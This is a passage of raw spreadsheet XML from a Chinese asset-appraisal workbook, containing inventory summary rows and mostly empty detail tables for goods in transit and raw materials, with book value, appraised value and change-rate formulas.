    <row r="11" ht="17.25" customHeight="1" s="415">
      <c r="B11" s="284" t="inlineStr">
        <is>
          <t>3-9-6</t>
        </is>
      </c>
      <c r="C11" s="397" t="inlineStr">
        <is>
          <t>存货在产</t>
        </is>
      </c>
      <c r="D11" s="182" t="inlineStr">
        <is>
          <t>在产品（自制半成品）</t>
        </is>
      </c>
      <c r="E11" s="555">
        <f>'3-9-6在产品（自制半成品）'!H28</f>
        <v/>
      </c>
      <c r="F11" s="555">
        <f>'3-9-6在产品（自制半成品）'!K28</f>
        <v/>
      </c>
      <c r="G11" s="555">
        <f>F11-E11</f>
        <v/>
      </c>
      <c r="H11" s="555">
        <f>IF(E11=0,"",G11/E11*100)</f>
        <v/>
      </c>
      <c r="I11" s="347" t="n"/>
      <c r="J11" s="347" t="n"/>
      <c r="K11" s="347" t="n"/>
      <c r="L11" s="322" t="n"/>
    </row>
    <row r="12" ht="17.25" customHeight="1" s="415">
      <c r="B12" s="284" t="inlineStr">
        <is>
          <t>3-9-7</t>
        </is>
      </c>
      <c r="C12" s="397" t="inlineStr">
        <is>
          <t>存货发出</t>
        </is>
      </c>
      <c r="D12" s="182" t="inlineStr">
        <is>
          <t>发出商品</t>
        </is>
      </c>
      <c r="E12" s="555">
        <f>'3-9-7发出商品'!H28</f>
        <v/>
      </c>
      <c r="F12" s="555">
        <f>'3-9-7发出商品'!K28</f>
        <v/>
      </c>
      <c r="G12" s="555">
        <f>F12-E12</f>
        <v/>
      </c>
      <c r="H12" s="555">
        <f>IF(E12=0,"",G12/E12*100)</f>
        <v/>
      </c>
      <c r="I12" s="347" t="n"/>
      <c r="J12" s="347" t="n"/>
      <c r="K12" s="347" t="n"/>
      <c r="L12" s="322" t="n"/>
    </row>
    <row r="13" ht="17.25" customHeight="1" s="415">
      <c r="B13" s="284" t="inlineStr">
        <is>
          <t>3-9-8</t>
        </is>
      </c>
      <c r="C13" s="397" t="inlineStr">
        <is>
          <t>存货在用</t>
        </is>
      </c>
      <c r="D13" s="182" t="inlineStr">
        <is>
          <t>在用周转材料</t>
        </is>
      </c>
      <c r="E13" s="555">
        <f>'3-9-8在用周转材料'!H28</f>
        <v/>
      </c>
      <c r="F13" s="555">
        <f>'3-9-8在用周转材料'!L28</f>
        <v/>
      </c>
      <c r="G13" s="555">
        <f>F13-E13</f>
        <v/>
      </c>
      <c r="H13" s="555">
        <f>IF(E13=0,"",G13/E13*100)</f>
        <v/>
      </c>
      <c r="I13" s="347" t="n"/>
      <c r="J13" s="347" t="n"/>
      <c r="K13" s="347" t="n"/>
      <c r="L13" s="322" t="n"/>
    </row>
    <row r="14" ht="17.25" customFormat="1" customHeight="1" s="410">
      <c r="B14" s="284" t="inlineStr">
        <is>
          <t>3-9-9</t>
        </is>
      </c>
      <c r="C14" s="91" t="inlineStr">
        <is>
          <t>存货履约</t>
        </is>
      </c>
      <c r="D14" s="157" t="inlineStr">
        <is>
          <t>合同履约成本</t>
        </is>
      </c>
      <c r="E14" s="591">
        <f>'3-9-9合同履约成本'!E28</f>
        <v/>
      </c>
      <c r="F14" s="591">
        <f>'3-9-9合同履约成本'!F28</f>
        <v/>
      </c>
      <c r="G14" s="591">
        <f>F14-E14</f>
        <v/>
      </c>
      <c r="H14" s="591">
        <f>IF(E14=0,"",G14/E14*100)</f>
        <v/>
      </c>
      <c r="I14" s="347" t="n"/>
      <c r="J14" s="347" t="n"/>
      <c r="K14" s="347" t="n"/>
      <c r="L14" s="322" t="n"/>
    </row>
    <row r="15" ht="17.25" customHeight="1" s="415">
      <c r="B15" s="284" t="n"/>
      <c r="C15" s="397" t="n"/>
      <c r="D15" s="327" t="n"/>
      <c r="E15" s="555" t="n"/>
      <c r="F15" s="555" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="347" t="n"/>
      <c r="J15" s="347" t="n"/>
      <c r="K15" s="347" t="n"/>
      <c r="L15" s="322" t="n"/>
    </row>
    <row r="16" ht="17.25" customHeight="1" s="415">
      <c r="B16" s="284" t="n"/>
      <c r="C16" s="397" t="n"/>
      <c r="D16" s="327" t="n"/>
      <c r="E16" s="555" t="n"/>
      <c r="F16" s="555" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="347" t="n"/>
      <c r="J16" s="347" t="n"/>
      <c r="K16" s="347" t="n"/>
      <c r="L16" s="322" t="n"/>
    </row>
    <row r="17" ht="17.25" customHeight="1" s="415">
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="307" t="n"/>
      <c r="D17" s="327" t="n"/>
      <c r="E17" s="555" t="n"/>
      <c r="F17" s="555" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="347" t="n"/>
      <c r="J17" s="347" t="n"/>
      <c r="K17" s="347" t="n"/>
      <c r="L17" s="322" t="n"/>
    </row>
    <row r="18" ht="17.25" customHeight="1" s="415">
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="307" t="n"/>
      <c r="D18" s="327" t="n"/>
      <c r="E18" s="555" t="n"/>
      <c r="F18" s="555" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="347" t="n"/>
      <c r="J18" s="347" t="n"/>
      <c r="K18" s="347" t="n"/>
      <c r="L18" s="322" t="n"/>
    </row>
    <row r="19" ht="17.25" customHeight="1" s="415">
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="307" t="n"/>
      <c r="D19" s="327" t="n"/>
      <c r="E19" s="555" t="n"/>
      <c r="F19" s="555" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="347" t="n"/>
      <c r="J19" s="347" t="n"/>
      <c r="K19" s="347" t="n"/>
      <c r="L19" s="322" t="n"/>
    </row>
    <row r="20" ht="17.25" customHeight="1" s="415">
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="307" t="n"/>
      <c r="D20" s="327" t="n"/>
      <c r="E20" s="555" t="n"/>
      <c r="F20" s="555" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="347" t="n"/>
      <c r="J20" s="347" t="n"/>
      <c r="K20" s="347" t="n"/>
      <c r="L20" s="322" t="n"/>
    </row>
    <row r="21" ht="17.25" customHeight="1" s="415">
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="307" t="n"/>
      <c r="D21" s="327" t="n"/>
      <c r="E21" s="555" t="n"/>
      <c r="F21" s="555" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="347" t="n"/>
      <c r="J21" s="347" t="n"/>
      <c r="K21" s="347" t="n"/>
      <c r="L21" s="322" t="n"/>
    </row>
    <row r="22" ht="17.25" customHeight="1" s="415">
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="307" t="n"/>
      <c r="D22" s="327" t="n"/>
      <c r="E22" s="555" t="n"/>
      <c r="F22" s="555" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="347" t="n"/>
      <c r="J22" s="347" t="n"/>
      <c r="K22" s="347" t="n"/>
      <c r="L22" s="322" t="n"/>
    </row>
    <row r="23" ht="17.25" customHeight="1" s="415">
      <c r="A23" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B23" s="383" t="n"/>
      <c r="C23" s="383" t="inlineStr">
        <is>
          <t>存货净额</t>
        </is>
      </c>
      <c r="D23" s="380" t="inlineStr">
        <is>
          <t>合           计</t>
        </is>
      </c>
      <c r="E23" s="591">
        <f>SUM(E6:E14)</f>
        <v/>
      </c>
      <c r="F23" s="591">
        <f>SUM(F6:F14)</f>
        <v/>
      </c>
      <c r="G23" s="591">
        <f>F23-E23</f>
        <v/>
      </c>
      <c r="H23" s="591">
        <f>IF(E23=0,"",G23/E23*100)</f>
        <v/>
      </c>
      <c r="I23" s="347" t="n"/>
      <c r="J23" s="347" t="n"/>
      <c r="K23" s="347" t="n"/>
      <c r="L23" s="322" t="n"/>
    </row>
    <row r="24" s="415">
      <c r="B24" s="346" t="n"/>
      <c r="C24" s="346" t="n"/>
      <c r="D24" s="347" t="n"/>
      <c r="E24" s="347" t="n"/>
      <c r="F24" s="184" t="n"/>
      <c r="G24" s="550" t="n"/>
      <c r="H24" s="550" t="n"/>
      <c r="I24" s="347" t="n"/>
      <c r="J24" s="347" t="n"/>
      <c r="K24" s="347" t="n"/>
      <c r="L24" s="322" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="3">
    <mergeCell ref="B1:H1"/>
    <mergeCell ref="B2:H2"/>
    <mergeCell ref="F24:H24"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:H24">
    <cfRule type="expression" priority="4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30.xml><?xml version="1.0" encoding="utf-8"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetPr codeName="Sheet28">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:M29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12.8333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="10" customWidth="1" style="410" min="2" max="2"/>
    <col width="18.3333333333333" customWidth="1" style="410" min="3" max="3"/>
    <col width="9.66666666666667" customWidth="1" style="410" min="4" max="5"/>
    <col width="7.66666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col width="13.1666666666667" customWidth="1" style="410" min="7" max="7"/>
    <col outlineLevel="1" width="10.6666666666667" customWidth="1" style="410" min="8" max="9"/>
    <col outlineLevel="1" width="12.6666666666667" customWidth="1" style="410" min="10" max="10"/>
    <col outlineLevel="1" width="9.66666666666667" customWidth="1" style="410" min="11" max="11"/>
    <col outlineLevel="1" width="7" customWidth="1" style="410" min="12" max="12"/>
    <col width="13.1666666666667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存货—在途物资评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" s="415">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="3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373" t="n"/>
      <c r="L3" s="373" t="n"/>
      <c r="M3" s="402" t="inlineStr">
        <is>
          <t>表3-9-1</t>
        </is>
      </c>
    </row>
    <row r="4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名称及规格型号</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>计量单位</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="F5" s="593" t="n"/>
      <c r="G5" s="567" t="n"/>
      <c r="H5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="I5" s="593" t="n"/>
      <c r="J5" s="567" t="n"/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380" t="inlineStr">
        <is>
          <t>数量</t>
        </is>
      </c>
      <c r="F6" s="380" t="inlineStr">
        <is>
          <t>单价</t>
        </is>
      </c>
      <c r="G6" s="380" t="inlineStr">
        <is>
          <t>金额</t>
        </is>
      </c>
      <c r="H6" s="380" t="inlineStr">
        <is>
          <t>实际数量</t>
        </is>
      </c>
      <c r="I6" s="380" t="inlineStr">
        <is>
          <t>评估单价</t>
        </is>
      </c>
      <c r="J6" s="380" t="inlineStr">
        <is>
          <t>金额</t>
        </is>
      </c>
      <c r="K6" s="594" t="n"/>
      <c r="L6" s="594" t="n"/>
      <c r="M6" s="594" t="n"/>
    </row>
    <row r="7" ht="16.5" customHeight="1" s="415">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="284" t="n"/>
      <c r="C7" s="198" t="n"/>
      <c r="D7" s="313" t="n"/>
      <c r="E7" s="555" t="n"/>
      <c r="F7" s="555" t="n"/>
      <c r="G7" s="555" t="n"/>
      <c r="H7" s="555" t="n"/>
      <c r="I7" s="555" t="n"/>
      <c r="J7" s="555" t="n"/>
      <c r="K7" s="555">
        <f>J7-G7</f>
        <v/>
      </c>
      <c r="L7" s="555">
        <f>IF(G7=0,"",K7/G7*100)</f>
        <v/>
      </c>
      <c r="M7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customHeight="1" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="284" t="n"/>
      <c r="C8" s="198" t="n"/>
      <c r="D8" s="313" t="n"/>
      <c r="E8" s="555" t="n"/>
      <c r="F8" s="555" t="n"/>
      <c r="G8" s="555" t="n"/>
      <c r="H8" s="555" t="n"/>
      <c r="I8" s="555" t="n"/>
      <c r="J8" s="555" t="n"/>
      <c r="K8" s="555">
        <f>J8-G8</f>
        <v/>
      </c>
      <c r="L8" s="555">
        <f>IF(G8=0,"",K8/G8*100)</f>
        <v/>
      </c>
      <c r="M8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="284" t="n"/>
      <c r="C9" s="198" t="n"/>
      <c r="D9" s="313" t="n"/>
      <c r="E9" s="555" t="n"/>
      <c r="F9" s="555" t="n"/>
      <c r="G9" s="555" t="n"/>
      <c r="H9" s="555" t="n"/>
      <c r="I9" s="555" t="n"/>
      <c r="J9" s="555" t="n"/>
      <c r="K9" s="555">
        <f>J9-G9</f>
        <v/>
      </c>
      <c r="L9" s="555">
        <f>IF(G9=0,"",K9/G9*100)</f>
        <v/>
      </c>
      <c r="M9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="284" t="n"/>
      <c r="C10" s="198" t="n"/>
      <c r="D10" s="313" t="n"/>
      <c r="E10" s="555" t="n"/>
      <c r="F10" s="555" t="n"/>
      <c r="G10" s="555" t="n"/>
      <c r="H10" s="555" t="n"/>
      <c r="I10" s="555" t="n"/>
      <c r="J10" s="555" t="n"/>
      <c r="K10" s="555">
        <f>J10-G10</f>
        <v/>
      </c>
      <c r="L10" s="555">
        <f>IF(G10=0,"",K10/G10*100)</f>
        <v/>
      </c>
      <c r="M10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customHeight="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="284" t="n"/>
      <c r="C11" s="198" t="n"/>
      <c r="D11" s="313" t="n"/>
      <c r="E11" s="555" t="n"/>
      <c r="F11" s="555" t="n"/>
      <c r="G11" s="555" t="n"/>
      <c r="H11" s="555" t="n"/>
      <c r="I11" s="555" t="n"/>
      <c r="J11" s="555" t="n"/>
      <c r="K11" s="555">
        <f>J11-G11</f>
        <v/>
      </c>
      <c r="L11" s="555">
        <f>IF(G11=0,"",K11/G11*100)</f>
        <v/>
      </c>
      <c r="M11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customHeight="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="284" t="n"/>
      <c r="C12" s="198" t="n"/>
      <c r="D12" s="313" t="n"/>
      <c r="E12" s="555" t="n"/>
      <c r="F12" s="555" t="n"/>
      <c r="G12" s="555" t="n"/>
      <c r="H12" s="555" t="n"/>
      <c r="I12" s="555" t="n"/>
      <c r="J12" s="555" t="n"/>
      <c r="K12" s="555">
        <f>J12-G12</f>
        <v/>
      </c>
      <c r="L12" s="555">
        <f>IF(G12=0,"",K12/G12*100)</f>
        <v/>
      </c>
      <c r="M12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customHeight="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="284" t="n"/>
      <c r="C13" s="198" t="n"/>
      <c r="D13" s="313" t="n"/>
      <c r="E13" s="555" t="n"/>
      <c r="F13" s="555" t="n"/>
      <c r="G13" s="555" t="n"/>
      <c r="H13" s="555" t="n"/>
      <c r="I13" s="555" t="n"/>
      <c r="J13" s="555" t="n"/>
      <c r="K13" s="555">
        <f>J13-G13</f>
        <v/>
      </c>
      <c r="L13" s="555">
        <f>IF(G13=0,"",K13/G13*100)</f>
        <v/>
      </c>
      <c r="M13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customHeight="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="284" t="n"/>
      <c r="C14" s="198" t="n"/>
      <c r="D14" s="313" t="n"/>
      <c r="E14" s="555" t="n"/>
      <c r="F14" s="555" t="n"/>
      <c r="G14" s="555" t="n"/>
      <c r="H14" s="555" t="n"/>
      <c r="I14" s="555" t="n"/>
      <c r="J14" s="555" t="n"/>
      <c r="K14" s="555">
        <f>J14-G14</f>
        <v/>
      </c>
      <c r="L14" s="555">
        <f>IF(G14=0,"",K14/G14*100)</f>
        <v/>
      </c>
      <c r="M14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customHeight="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="284" t="n"/>
      <c r="C15" s="198" t="n"/>
      <c r="D15" s="313" t="n"/>
      <c r="E15" s="555" t="n"/>
      <c r="F15" s="555" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="555" t="n"/>
      <c r="J15" s="555" t="n"/>
      <c r="K15" s="555">
        <f>J15-G15</f>
        <v/>
      </c>
      <c r="L15" s="555">
        <f>IF(G15=0,"",K15/G15*100)</f>
        <v/>
      </c>
      <c r="M15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customHeight="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="284" t="n"/>
      <c r="C16" s="198" t="n"/>
      <c r="D16" s="313" t="n"/>
      <c r="E16" s="555" t="n"/>
      <c r="F16" s="555" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="555" t="n"/>
      <c r="J16" s="555" t="n"/>
      <c r="K16" s="555">
        <f>J16-G16</f>
        <v/>
      </c>
      <c r="L16" s="555">
        <f>IF(G16=0,"",K16/G16*100)</f>
        <v/>
      </c>
      <c r="M16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customHeight="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="284" t="n"/>
      <c r="C17" s="198" t="n"/>
      <c r="D17" s="313" t="n"/>
      <c r="E17" s="555" t="n"/>
      <c r="F17" s="555" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="555" t="n"/>
      <c r="J17" s="555" t="n"/>
      <c r="K17" s="555">
        <f>J17-G17</f>
        <v/>
      </c>
      <c r="L17" s="555">
        <f>IF(G17=0,"",K17/G17*100)</f>
        <v/>
      </c>
      <c r="M17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customHeight="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="284" t="n"/>
      <c r="C18" s="198" t="n"/>
      <c r="D18" s="313" t="n"/>
      <c r="E18" s="555" t="n"/>
      <c r="F18" s="555" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="555" t="n"/>
      <c r="J18" s="555" t="n"/>
      <c r="K18" s="555">
        <f>J18-G18</f>
        <v/>
      </c>
      <c r="L18" s="555">
        <f>IF(G18=0,"",K18/G18*100)</f>
        <v/>
      </c>
      <c r="M18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customHeight="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="284" t="n"/>
      <c r="C19" s="198" t="n"/>
      <c r="D19" s="313" t="n"/>
      <c r="E19" s="555" t="n"/>
      <c r="F19" s="555" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="555" t="n"/>
      <c r="J19" s="555" t="n"/>
      <c r="K19" s="555">
        <f>J19-G19</f>
        <v/>
      </c>
      <c r="L19" s="555">
        <f>IF(G19=0,"",K19/G19*100)</f>
        <v/>
      </c>
      <c r="M19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customHeight="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="284" t="n"/>
      <c r="C20" s="198" t="n"/>
      <c r="D20" s="313" t="n"/>
      <c r="E20" s="555" t="n"/>
      <c r="F20" s="555" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="555" t="n"/>
      <c r="J20" s="555" t="n"/>
      <c r="K20" s="555">
        <f>J20-G20</f>
        <v/>
      </c>
      <c r="L20" s="555">
        <f>IF(G20=0,"",K20/G20*100)</f>
        <v/>
      </c>
      <c r="M20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customHeight="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="284" t="n"/>
      <c r="C21" s="198" t="n"/>
      <c r="D21" s="313" t="n"/>
      <c r="E21" s="555" t="n"/>
      <c r="F21" s="555" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="555" t="n"/>
      <c r="J21" s="555" t="n"/>
      <c r="K21" s="555">
        <f>J21-G21</f>
        <v/>
      </c>
      <c r="L21" s="555">
        <f>IF(G21=0,"",K21/G21*100)</f>
        <v/>
      </c>
      <c r="M21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customHeight="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="284" t="n"/>
      <c r="C22" s="198" t="n"/>
      <c r="D22" s="313" t="n"/>
      <c r="E22" s="555" t="n"/>
      <c r="F22" s="555" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="555" t="n"/>
      <c r="J22" s="555" t="n"/>
      <c r="K22" s="555">
        <f>J22-G22</f>
        <v/>
      </c>
      <c r="L22" s="555">
        <f>IF(G22=0,"",K22/G22*100)</f>
        <v/>
      </c>
      <c r="M22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customHeight="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="284" t="n"/>
      <c r="C23" s="198" t="n"/>
      <c r="D23" s="313" t="n"/>
      <c r="E23" s="555" t="n"/>
      <c r="F23" s="555" t="n"/>
      <c r="G23" s="555" t="n"/>
      <c r="H23" s="555" t="n"/>
      <c r="I23" s="555" t="n"/>
      <c r="J23" s="555" t="n"/>
      <c r="K23" s="555">
        <f>J23-G23</f>
        <v/>
      </c>
      <c r="L23" s="555">
        <f>IF(G23=0,"",K23/G23*100)</f>
        <v/>
      </c>
      <c r="M23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customHeight="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="284" t="n"/>
      <c r="C24" s="198" t="n"/>
      <c r="D24" s="313" t="n"/>
      <c r="E24" s="555" t="n"/>
      <c r="F24" s="555" t="n"/>
      <c r="G24" s="555" t="n"/>
      <c r="H24" s="555" t="n"/>
      <c r="I24" s="555" t="n"/>
      <c r="J24" s="555" t="n"/>
      <c r="K24" s="555">
        <f>J24-G24</f>
        <v/>
      </c>
      <c r="L24" s="555">
        <f>IF(G24=0,"",K24/G24*100)</f>
        <v/>
      </c>
      <c r="M24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customHeight="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="383" t="n"/>
      <c r="D25" s="383" t="n"/>
      <c r="E25" s="555" t="n"/>
      <c r="F25" s="555" t="n"/>
      <c r="G25" s="555" t="n"/>
      <c r="H25" s="555" t="n"/>
      <c r="I25" s="555" t="n"/>
      <c r="J25" s="555" t="n"/>
      <c r="K25" s="555">
        <f>J25-G25</f>
        <v/>
      </c>
      <c r="L25" s="555">
        <f>IF(G25=0,"",K25/G25*100)</f>
        <v/>
      </c>
      <c r="M25" s="383" t="n"/>
    </row>
    <row r="26" ht="20.2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3" t="n"/>
      <c r="E26" s="555">
        <f>ROUND(SUM(E7:E25),2)</f>
        <v/>
      </c>
      <c r="F26" s="555" t="n"/>
      <c r="G26" s="555">
        <f>ROUND(SUM(G7:G25),2)</f>
        <v/>
      </c>
      <c r="H26" s="555">
        <f>ROUND(SUM(H7:H25),2)</f>
        <v/>
      </c>
      <c r="I26" s="555" t="n"/>
      <c r="J26" s="555">
        <f>ROUND(SUM(J7:J25),2)</f>
        <v/>
      </c>
      <c r="K26" s="555">
        <f>J26-G26</f>
        <v/>
      </c>
      <c r="L26" s="555">
        <f>IF(G26=0,"",K26/G26*100)</f>
        <v/>
      </c>
      <c r="M26" s="383" t="n"/>
    </row>
    <row r="27" s="415">
      <c r="A27" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B27" s="185" t="inlineStr">
        <is>
          <t>减：存货跌价准备</t>
        </is>
      </c>
      <c r="C27" s="567" t="n"/>
      <c r="D27" s="383" t="n"/>
      <c r="E27" s="555" t="n"/>
      <c r="F27" s="555" t="n"/>
      <c r="G27" s="555" t="n"/>
      <c r="H27" s="555" t="n"/>
      <c r="I27" s="555" t="n"/>
      <c r="J27" s="555" t="n"/>
      <c r="K27" s="555">
        <f>J27-G27</f>
        <v/>
      </c>
      <c r="L27" s="555">
        <f>IF(G27=0,"",K27/G27*100)</f>
        <v/>
      </c>
      <c r="M27" s="383" t="n"/>
    </row>
    <row r="28" s="415">
      <c r="A28" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B28" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C28" s="567" t="n"/>
      <c r="D28" s="383" t="n"/>
      <c r="E28" s="555">
        <f>ROUND(E26-E27,2)</f>
        <v/>
      </c>
      <c r="F28" s="555" t="n"/>
      <c r="G28" s="555">
        <f>ROUND(G26-G27,2)</f>
        <v/>
      </c>
      <c r="H28" s="555">
        <f>ROUND(H26-H27,2)</f>
        <v/>
      </c>
      <c r="I28" s="555" t="n"/>
      <c r="J28" s="555">
        <f>ROUND(J26-J27,2)</f>
        <v/>
      </c>
      <c r="K28" s="555">
        <f>J28-G28</f>
        <v/>
      </c>
      <c r="L28" s="555">
        <f>IF(G28=0,"",K28/G28*100)</f>
        <v/>
      </c>
      <c r="M28" s="383" t="n"/>
    </row>
    <row r="29" s="415">
      <c r="A29" s="116" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="13">
    <mergeCell ref="B2:M2"/>
    <mergeCell ref="B26:C26"/>
    <mergeCell ref="E5:G5"/>
    <mergeCell ref="B5:B6"/>
    <mergeCell ref="H5:J5"/>
    <mergeCell ref="B28:C28"/>
    <mergeCell ref="M5:M6"/>
    <mergeCell ref="C5:C6"/>
    <mergeCell ref="B1:M1"/>
    <mergeCell ref="B27:C27"/>
    <mergeCell ref="D5:D6"/>
    <mergeCell ref="K5:K6"/>
    <mergeCell ref="L5:L6"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:M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5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 codeName="Sheet29">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:N28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9" customWidth="1" style="410" min="1" max="1"/>
    <col width="10" customWidth="1" style="204" min="2" max="2"/>
    <col width="21.3333333333333" customWidth="1" style="410" min="3" max="3"/>
    <col width="6.16666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col hidden="1" width="5.16666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col width="10.8333333333333" customWidth="1" style="317" min="6" max="6"/>
    <col width="8.33333333333333" customWidth="1" style="317" min="7" max="7"/>
    <col width="13.1666666666667" customWidth="1" style="317" min="8" max="8"/>
    <col outlineLevel="1" width="9.66666666666667" customWidth="1" style="410" min="9" max="10"/>
    <col outlineLevel="1" width="11.5" customWidth="1" style="410" min="11" max="11"/>
    <col outlineLevel="1" width="8.16666666666667" customWidth="1" style="410" min="12" max="12"/>
    <col outlineLevel="1" width="7.66666666666667" customWidth="1" style="410" min="13" max="13"/>
    <col width="11.6666666666667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存货—原材料评估明细表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7" t="n"/>
      <c r="L3" s="547" t="n"/>
      <c r="M3" s="547" t="n"/>
      <c r="N3" s="548" t="inlineStr">
        <is>
          <t>表3-9-2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18" t="n"/>
      <c r="G4" s="318" t="n"/>
      <c r="H4" s="318" t="n"/>
      <c r="I4" s="376" t="n"/>
      <c r="J4" s="376" t="n"/>
      <c r="K4" s="376" t="n"/>
      <c r="L4" s="376" t="n"/>
      <c r="M4" s="376" t="n"/>
      <c r="N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名称及规格型号</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>计量单位</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>存放地点</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="G5" s="593" t="n"/>
      <c r="H5" s="567" t="n"/>
      <c r="I5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="J5" s="593" t="n"/>
      <c r="K5" s="567" t="n"/>
      <c r="L5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="M5" s="380" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="N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380" t="inlineStr">
        <is>
          <t>数量</t>
        </is>
      </c>
      <c r="G6" s="380" t="inlineStr">
        <is>
          <t>单价</t>
        </is>
      </c>
      <c r="H6" s="380" t="inlineStr">
        <is>
          <t>金额</t>
        </is>
      </c>
      <c r="I6" s="380" t="inlineStr">
        <is>
          <t>实际数量</t>
        </is>
      </c>
      <c r="J6" s="380" t="inlineStr">
        <is>
          <t>评估单价</t>
        </is>
      </c>
      <c r="K6" s="380" t="inlineStr">
